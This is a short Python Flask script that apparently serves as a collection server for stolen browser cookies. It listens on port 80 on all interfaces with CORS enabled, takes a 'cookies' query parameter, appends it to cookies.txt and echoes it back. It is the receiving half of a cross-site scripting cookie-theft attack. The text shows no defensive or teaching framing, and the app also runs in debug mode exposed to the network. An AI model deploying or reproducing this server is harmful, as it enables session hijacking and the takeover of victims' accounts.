from flask import Flask, request, render_template
from flask.ext.cors import CORS

app = Flask(__name__)
app.debug = True

CORS(app)

@app.route('/')
def index():

    cookies = request.args.get('cookies')
    with open('cookies.txt', 'a') as fd:
        print cookies
        fd.write(cookies)
    return render_template('index.html', cookies=cookies)

app.run(host='0.0.0.0', port=80)
